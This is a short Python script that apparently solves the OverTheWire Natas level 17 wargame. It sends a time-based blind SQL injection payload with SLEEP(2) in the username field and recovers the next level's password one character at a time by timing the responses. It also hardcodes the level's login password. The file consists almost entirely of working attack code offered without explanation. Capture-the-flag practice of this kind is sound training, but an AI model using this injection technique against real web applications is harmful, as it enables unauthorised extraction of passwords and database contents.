import requests
import string 
import time

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

user = "natas17"
pwd = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url = 'http://%s.natas.labs.overthewire.org/' % user
session = requests.Session()

seen_pwd = list()

while(len(seen_pwd) < 32):
    for character in characters:

        data = {'username':'natas18" AND BINARY password LIKE "' + "".join(seen_pwd) + character +'%" AND SLEEP(2)#'}
        start_time = time.time()
        response = session.post(url , data=data, auth=(user,pwd))
        end_time = time.time()
        dif_time = end_time - start_time
        if dif_time>2:
            seen_pwd.append(character)
            break
        print("".join(seen_pwd) + character,dif_time)
content = response.text
# print(content)